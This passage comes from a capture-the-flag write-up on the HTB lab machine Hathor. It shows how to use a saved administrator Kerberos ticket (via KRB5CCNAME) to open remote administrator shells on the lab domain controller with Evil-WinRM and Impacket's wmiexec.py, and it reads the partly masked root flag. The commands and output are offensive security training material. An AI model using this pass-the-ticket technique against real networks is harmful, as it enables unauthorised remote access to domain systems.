[*] Saving ticket in administrator.ccache

```

`klist` and other Kerberos tools will use the location `/tmp/krb5cc_1000` to store tickets by default, but the `KRB5CCNAME` environment variable can be used to identify a different file. For example, using this ticket just acquired:

```

oxdf@hacky$ KRB5CCNAME=./administrator.ccache klist
Ticket cache: FILE:./administrator.ccache
Default principal: administrator@WINDCORP.HTB

Valid starting       Expires              Service principal
11/11/2022 11:54:12  11/11/2022 21:54:12  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 11/12/2022 11:54:11

```

### Shell

#### Evil-WinRM

Now I can connect over [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) using just the hostname and the realm:

```

oxdf@hacky$ evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTB

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

Or to use the ticket generated by `getTGT.py`:

```

oxdf@hacky$ KRB5CCNAME=./administrator.ccache evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTB

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

From here I can grab the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
1a921d83************************

```

#### wmiexec.py

Impacket tools like `wmiexec.py` will work as well:

```

oxdf@hacky$ KRB5CCNAME=./administrator.ccache wmiexec.py windcorp.htb/administrator@hathor.windcorp.h
tb -k -no-pass
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation                                                  

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>

```

I can use the default ticket, but only if i specify the location:

```

oxdf@hacky$ wmiexec.py windcorp.htb/administrator@hathor.windcorp.htb -k -no-pass
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)

oxdf@hacky$ KRB5CCNAME=/tmp/krb5cc_1000 wmiexec.py windcorp.htb/administrator@hathor.windcorp.htb -k 
-no-pass
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>

```